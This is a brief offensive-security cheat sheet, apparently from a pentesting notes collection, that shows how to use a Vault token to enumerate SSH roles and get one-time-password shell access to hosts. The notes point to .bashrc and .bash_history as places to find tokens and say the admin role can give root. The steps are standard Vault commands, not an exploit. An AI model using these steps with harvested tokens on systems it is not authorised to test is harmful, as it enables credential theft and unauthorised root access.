# HashiCorp Vault SSH OTP

Vault can issue one-time passwords for SSH. If you have a Vault token, enumerate SSH roles and use them to get shell access.

## Setup

```bash
export VAULT_ADDR="http://<VAULT_HOST>"
export VAULT_TOKEN="hvs.<TOKEN>"
vault token lookup  # verify token validity and permissions
```

## Enumerate SSH Roles

```bash
vault list ssh/roles
# Returns: admin_otp_key_role, dev_otp_key_role, etc.
vault read ssh/roles/<ROLE_NAME>
# Check allowed_users field — shows which users are permitted
```

## SSH via OTP

```bash
vault ssh --role <ROLE_NAME> --mode otp --strict-host-key-checking=no <user>@<TARGET>
```

## Notes

- Token may be in `.bashrc`, `.bash_history`, or old config backups
- `dev_otp_key_role` typically allows non-root users; `admin_otp_key_role` allows root
- CIDR restrictions on the role may block access from certain source IPs
- If `vault list ssh/roles` fails, try `vault list ssh` first to confirm the path
- `--strict-host-key-checking=no` needed if Vault can't verify host key
